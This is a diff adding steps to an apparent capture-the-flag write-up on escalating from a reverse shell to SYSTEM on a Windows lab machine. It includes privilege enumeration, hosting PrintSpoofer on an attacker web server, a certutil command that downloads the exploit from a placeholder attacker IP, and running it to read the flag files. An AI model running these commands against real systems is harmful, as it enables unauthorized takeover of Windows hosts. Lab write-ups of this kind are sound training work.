@@ -207,3 +207,101 @@ As soon as I accessed the payload, the connection was established back to my lis
 I successfully obtained a reverse shell on the target system.
 
 📷 Screenshot (reverse shell obtained)
+---
+
+
+## 🛠 Step 6: Checking Privileges for Escalation
+
+Once I had a reverse shell on the target, the first step was to check the current privileges available to my user session.  
+
+I used the following command inside the Windows shell:  
+
+```bash
+whoami /priv
+```
+📷 Screenshot (privilege enumeration output)
+
+🔎 Findings
+From the output, I observed that the SeImpersonatePrivilege was Enabled.
+
+Privilege: SeImpersonatePrivilege
+
+Description: Allows impersonation of a client after authentication.
+
+Significance: This privilege is often abused for privilege escalation attacks such as Juicy Potato, PrintSpoofer, or Rogue Potato, which can allow escalation to SYSTEM.
+
+✅ Conclusion
+The presence of SeImpersonatePrivilege (Enabled) indicated that the system was vulnerable to a known privilege escalation technique.
+This gave me a clear path forward to attempt SYSTEM-level access.
+---
+
+
+## 🛠 Step 7: Privilege Escalation with PrintSpoofer
+
+After discovering the SeImpersonatePrivilege permission (📷 Screenshot above), I knew this could be exploited to escalate privileges on Windows.
+
+### 1️⃣ Hosting the Exploit on Attacker Machine
+
+On my Kali machine, I hosted the PrintSpoofer64.exe exploit using a simple Python HTTP server:
+```
+python3 -m http.server 80
+```
+
+📷 Screenshot (showing PrintSpoofer64.exe in my Kali directory and Python HTTP server running)
+
+### 2️⃣ Transferring the Exploit to Target Machine
+
+On the target machine, I used certutil (a built-in Windows utility) to download the exploit from my attacker machine:
+```
+certutil -urlcache -f http://<attacker-ip>/PrintSpoofer64.exe PrintSpoofer64.exe
+```
+
+📷 Screenshot (showing successful transfer of the file)
+
+### 3️⃣ Executing the Exploit
+
+Next, I ran the exploit to spawn a privileged command shell:
+```
+PrintSpoofer64.exe -i -c cmd.exe
+```
+
+📷 Screenshot (showing SeImpersonatePrivilege exploited and elevated shell obtained)
+
+### ✅ Result
+
+By leveraging PrintSpoofer64.exe, I successfully escalated privileges and obtained a SYSTEM-level shell, paving the way to capture the final Root Flag.
+
+---
+
+
+
+## 🏁 Step 11: Capturing the Flags
+### 1️⃣ Root Flag
+
+With SYSTEM-level access, I navigated to the Administrator’s Desktop and retrieved the root.txt file:
+```
+type C:\Users\Administrator\Desktop\root.txt
+```
+
+📷 Screenshot (showing the root flag)
+
+### ✅ Successfully captured the Root Flag.
+
+### 2️⃣ User Flag
+
+Similarly, the User Flag was found in the Bob user’s Desktop directory:
+```
+type C:\Users\Bob\Desktop\user.txt
+```
+
+📷 Screenshot (optional, showing the user flag)
+
+### ✅ Successfully captured the User Flag.
+
+## 🎯 Final Result
+
+User Flag → C:\Users\Bob\Desktop\user.txt
+
+Root Flag → C:\Users\Administrator\Desktop\root.txt
+
+This concludes the successful exploitation and privilege escalation of the target machine.
